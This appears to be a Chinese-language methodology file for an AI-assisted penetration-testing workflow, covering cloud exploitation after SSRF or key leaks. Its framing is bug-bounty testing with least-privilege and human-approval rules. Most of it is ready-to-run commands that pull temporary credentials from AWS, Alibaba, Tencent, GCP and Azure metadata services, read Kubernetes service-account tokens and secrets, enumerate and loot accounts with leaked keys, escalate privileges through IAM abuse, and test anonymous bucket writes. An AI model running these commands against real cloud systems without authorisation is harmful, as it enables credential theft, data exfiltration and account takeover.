---
name: cloud-security
description: CWE: 798(硬编码凭证) / 918(SSRF) / 284(未授权) / 862(缺失授权) OWASP: A05:2021(安全误配置) / A07:2021(认证失败) / API8(安全误配置) 定位: 凭证驱动 + 元数据驱动的云攻击。SSRF 怎么发请求归 s…
category: methodology
---

# 云安全攻击协议

> **CWE**: 798(硬编码凭证) / 918(SSRF) / 284(未授权) / 862(缺失授权)
> **OWASP**: A05:2021(安全误配置) / A07:2021(认证失败) / API8(安全误配置)
> **定位**: 凭证驱动 + 元数据驱动的云攻击。SSRF 怎么发请求归 ssrf.md，请求到了云环境后怎么利用归本文件。

---

## 使用纪律

- 先按 §0 判断入口: 元数据、AK/SK、Bucket、K8s、云函数或云厂商 Header, 只读命中的章节。
- SSRF 探测和 OOB 证明先走 [vuln/ssrf.md](vuln/ssrf.md) 与 [oob-infrastructure.md](oob-infrastructure.md); 本文只处理命中云环境后的利用和影响定级。
- 云凭证验证以最小权限枚举为准, 不执行写入、删除、持久化、真实资源创建或横向扩展, 除非用户明确 HITL 批准。
- 影响证明必须记录云厂商、账号/项目/地域、资源类型、权限边界和脱敏输出; 不因单个 AK 字符串直接判 High/Critical。
- 厂商专属细节优先跳转 [technologies/alibaba-cloud.md](technologies/alibaba-cloud.md) 或 [technologies/tencent-cloud.md](technologies/tencent-cloud.md)。

---

## §0 First-pass: 快速探测

```
发现任意以下信号 → 立即进入对应章节:
├─ JS/硬编码中出现 AKIA/AKID/LTAI/TC3 → §2 云 AK 利用
├─ 接口接受 URL 参数 + 响应异常 → §1 云元数据表
├─ 响应 Header 含 x-amz-/x-oss-/x-cos- → §5 Bucket 未授权
├─ 内网环境 + K8s 特征 → §6 K8s ServiceAccount
└─ 响应含 Lambda/函数计算特征 → §7 云函数
```

---

## §1 云元数据 Endpoint 全表

> **用途**: SSRF 命中后的下一步。
> **原则**: 优先取凭证(AK/SK/Token)，其次取网络信息(VPC/安全组)。

### 1.1 AWS (IMDSv1 / IMDSv2)

**IMDSv1** (默认可用，无需 Token):

```bash
# 获取 IAM 角色名
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 获取临时 AK/SK/Token (替换 ROLE_NAME)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# 获取用户数据 (可能含启动脚本/硬编码凭证)
curl -s http://169.254.169.254/latest/user-data
# 获取网络信息
curl -s http://169.254.169.254/latest/meta-data/local-ipv4
curl -s http://169.254.169.254/latest/meta-data/local-hostname
```

**IMDSv2** (需先取 Token):

```bash
# Step 1: 获取 Session Token (TTL 最大 21600 秒)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: 用 Token 请求元数据
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### 1.2 阿里云

```bash
# 获取 RAM 角色 AK/SK
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
# 返回: AccessKeyId + AccessKeySecret + SecurityToken

# 获取实例 ID / 区域
curl -s http://100.100.100.200/latest/meta-data/instance-id
curl -s http://100.100.100.200/latest/meta-data/region-id

# 获取用户数据
curl -s http://100.100.100.200/latest/user-data
```

### 1.3 腾讯云

```bash
# 获取 CAM 角色 AK/SK
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/ROLE_NAME
# 返回: TmpSecretId + TmpSecretKey + Token

# 获取实例信息
curl -s http://metadata.tencentyun.com/latest/meta-data/instance-id
curl -s http://metadata.tencentyun.com/latest/meta-data/region
```

### 1.4 GCP

```bash
# 获取 Service Account Token (需 Metadata-Flavor header)
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# 返回: access_token (OAuth2)

# 获取 SA 邮箱
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# 获取项目/区域
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### 1.5 Azure

```bash
# 获取 Managed Identity Token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# 返回: access_token

# 获取实例元数据
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### 1.6 华为云

```bash
# 华为云元数据路径与 AWS 类似，尝试:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/local-ipv4
```

### 1.7 Kubernetes

```bash
# 容器内直接读文件 (最常见)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

---

## §2 AWS AK/SK 利用

### 2.1 攻击链

```
发现 AK/SK → 身份确认 → 权限枚举 → 资源访问/提权
```

### 2.2 复现步骤

**Step 1: 配置凭证**

```bash
# 环境变量 (快速)
export AWS_ACCESS_KEY_ID=AKIAxxxxxxxxxxxx
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxx
export AWS_DEFAULT_REGION=us-east-1

# 或 aws configure (持久)
aws configure --profile leaked
```

**Step 2: 身份确认**

```bash
aws sts get-caller-identity --profile leaked
# 预期: Account / UserId / Arn
```

**Step 3: 权限枚举**

```bash
aws iam list-user-policies --user-name XXX --profile leaked
aws iam list-attached-user-policies --user-name XXX --profile leaked
aws s3 ls --profile leaked
aws ec2 describe-instances --profile leaked
aws lambda list-functions --profile leaked
aws rds describe-db-instances --profile leaked
```

**Step 4: 资源访问**

```bash
# S3 下载敏感文件
aws s3 cp s3://bucket-name/sensitive-file . --profile leaked

# 读取 EC2 User Data (可能含凭证)
aws ec2 describe-instance-attribute --instance-id i-xxx --attribute userData --profile leaked

# 读取 Secrets Manager
aws secretsmanager get-secret-value --secret-id xxx --profile leaked

# 读取 SSM Parameter Store
aws ssm get-parameter --name /xxx --with-decryption --profile leaked
```

### 2.3 常见提权路径

| 路径 | 条件 | 命令 |
|------|------|------|
| iam:PassRole + lambda:CreateFunction | 可创建 Lambda 并挂载高权限 Role | `aws lambda create-function --role arn:xxx` |
| ec2:RunInstances + iam:PassRole | 可启动 EC2 并挂载高权限 Role | `aws ec2 run-instances --iam-instance-profile` |
| s3:GetObject 含 .env | Bucket 中有配置文件 | `aws s3 cp s3://xxx/.env .` |
| iam:CreateAccessKey | 可为其他用户创建 AK | `aws iam create-access-key --user-name admin` |
| lambda:GetFunction | Lambda 代码含硬编码凭证 | `aws lambda get-function --function-name xxx` |
| sts:AssumeRole | 可切换到更高权限 Role | `aws sts assume-role --role-arn xxx` |

---

## §3 阿里云 AK/SK 利用

### 3.1 攻击链

```
发现 LTAI 开头 AK → 身份确认 → 权限枚举 → 资源访问
```

### 3.2 复现步骤

**Step 1: 配置凭证**

```bash
aliyun configure --profile leaked
# 输入 AccessKey ID (LTAI...) / AccessKey Secret / Region (cn-hangzhou)
```

**Step 2: 身份确认**

```bash
aliyun sts GetCallerIdentity --profile leaked
```

**Step 3: 权限枚举**

```bash
aliyun oss ls
aliyun ecs DescribeInstances --RegionId cn-hangzhou
aliyun rds DescribeDBInstances --RegionId cn-hangzhou
```

**Step 4: 资源访问**

```bash
aliyun oss ls oss://bucket-name/
aliyun oss cp oss://bucket-name/sensitive-file . --profile leaked
```

### 3.3 常见提权路径

| 路径 | 条件 | 说明 |
|------|------|------|
| OSS 公开读写 | Bucket ACL 为 public-read-write | 直接上传/下载 |
| RAM User 可创建 AK | ram:CreateAccessKey 权限 | 为其他用户创建凭证 |
| ECS 可执行命令 | ecs:RunCommand 权限 | 通过云助手执行命令 |
| OSS 含备份文件 | 可列举 Bucket | .sql/.zip/.env 常见 |

---

## §4 腾讯云 AK/SK 利用

### 4.1 攻击链

```
发现 AKID 开头 AK → 身份确认 → 权限枚举 → 资源访问
```

### 4.2 复现步骤

**Step 1: 配置凭证**

```bash
pip install tccli
tccli configure --profile leaked
# 输入 SecretId (AKID...) / SecretKey / Region (ap-guangzhou)
```

**Step 2: 身份确认**

```bash
tccli sts GetCallerIdentity --profile leaked
```

**Step 3: 权限枚举**

```bash
tccli cos ListBuckets
tccli cvm DescribeInstances
```

**Step 4: 资源访问**

```bash
coscli ls cos://bucket-name-1250000000/
coscli cp cos://bucket-name-1250000000/sensitive-file .
```

---

## §5 Bucket/存储桶 未授权访问

### 5.1 URL 模式识别

| 云厂商 | Bucket URL 格式 | 示例 |
|--------|----------------|------|
| AWS S3 | `https://bucket-name.s3.amazonaws.com` | `https://mybucket.s3.amazonaws.com` |
| 阿里云 OSS | `https://bucket-name.oss-cn-hangzhou.aliyuncs.com` | `https://mybucket.oss-cn-shanghai.aliyuncs.com` |
| 腾讯云 COS | `https://bucket-name-1250000000.cos.ap-guangzhou.myqcloud.com` | `https://mybucket-1234567890.cos.ap-beijing.myqcloud.com` |
| GCS | `https://storage.googleapis.com/bucket-name` | `https://storage.googleapis.com/mybucket` |
| Azure Blob | `https://accountname.blob.core.windows.net/container` | `https://mystorage.blob.core.windows.net/data` |

### 5.2 复现步骤 (S3)

```bash
# 尝试列举对象
curl -s https://bucket-name.s3.amazonaws.com/?list-type=2
# 200 + <ListBucketResult> = 未授权读

# 下载敏感文件
curl -o file.txt https://bucket-name.s3.amazonaws.com/sensitive-file.txt

# 尝试上传 (验证写权限)
echo "test" > test.txt
curl -X PUT -T test.txt https://bucket-name.s3.amazonaws.com/test-upload.txt
# 200 = 未授权写 (Critical)

# 检查 Bucket ACL
curl -s https://bucket-name.s3.amazonaws.com/?acl
```

### 5.3 复现步骤 (阿里云 OSS)

```bash
# 列举对象
curl -s https://bucket-name.oss-cn-hangzhou.aliyuncs.com/
# 200 + <ListBucketResult> = 未授权读

# 下载文件
curl -o file.txt https://bucket-name.oss-cn-hangzhou.aliyuncs.com/sensitive-file

# 尝试上传
curl -X PUT -T test.txt https://bucket-name.oss-cn-hangzhou.aliyuncs.com/test.txt
```

### 5.4 复现步骤 (腾讯云 COS)

```bash
# 列举对象 (需含 AppId)
curl -s "https://bucket-name-1250000000.cos.ap-guangzhou.myqcloud.com/"

# 下载文件
curl -o file.txt "https://bucket-name-1250000000.cos.ap-guangzhou.myqcloud.com/sensitive-file"
```

---

## §6 Kubernetes ServiceAccount Token

### 6.1 攻击链

```
SSRF/容器逃逸 → 读取 SA Token → API Server 调用 → 提权/窃取
```

### 6.2 复现步骤

**Step 1: 读取 Token (容器内)**

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**Step 2: API Server 调用 (curl 等价 kubectl)**

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# 列出 Pod
curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# 列出 Secret
curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# 读取 Secret 内容
curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/SECRET_NAME
# base64 解码: echo "xxx" | base64 -d
```

---

## §7 云函数安全

### 7.1 AWS Lambda

**攻击链**: 发现 Lambda → 读取函数代码 → 提取硬编码凭证 → 环境变量泄露

```bash
aws lambda list-functions --profile leaked
aws lambda get-function --function-name xxx --profile leaked
# Code.Location → 下载 .zip 解压查看源码

aws lambda get-function-configuration --function-name xxx --profile leaked
# 检查 Environment.Variables 字段
```

### 7.2 阿里云函数计算

```bash
aliyun fc-open ListFunctions --serviceName xxx
aliyun fc-open GetFunction --serviceName xxx --functionName yyy
# 检查 environmentVariables 字段
```

---

## §8 False Positive 检查

云线索、AK/SK、对象存储、元数据和 K8s 的横向证据边界见 [cloud-evidence-boundaries.md](cloud-evidence-boundaries.md)。本文件只保留云厂商路径、命令和利用链; 定级前必须证明归属、权限边界和最小化影响。

---

## §8.5 上传返回包到对象存储权限边界

适用入口: 上传接口、图片回显、头像/附件/证书文件、MinIO/OSS/COS/S3 URL、前端配置中的 bucket/region/key/policy/signature。推进路径和权限证据分级统一见 [cloud-evidence-boundaries.md](cloud-evidence-boundaries.md); 本节保留对象存储入口索引。

EDUSRC 证书站、人员选择器和上传路径组合链见 [edusrc-workflow.md](edusrc-workflow.md)。

## §8.6 云线索权限分级与评级边界

云专项权限分级、评级边界和误判过滤主流程见 [cloud-evidence-boundaries.md](cloud-evidence-boundaries.md)。横向失败转向索引见 [src-failure-pivots.md §云线索与对象存储](src-failure-pivots.md)。

---

## §9 相关参考

- SSRF 入口 → [vuln/ssrf.md](vuln/ssrf.md) + [vuln/ssrf-scenarios.md](vuln/ssrf-scenarios.md)
- 敏感信息三阶段验证 → [sensitive-info-exploitation.md](sensitive-info-exploitation.md)
- 级联策略 → [chained-logic-extended.md](chained-logic-extended.md)
- 直觉触发 (SSRF→云元数据) → [intuition-triggers.md](intuition-triggers.md)
- 报告模板 → [report-template.md](report-template.md)
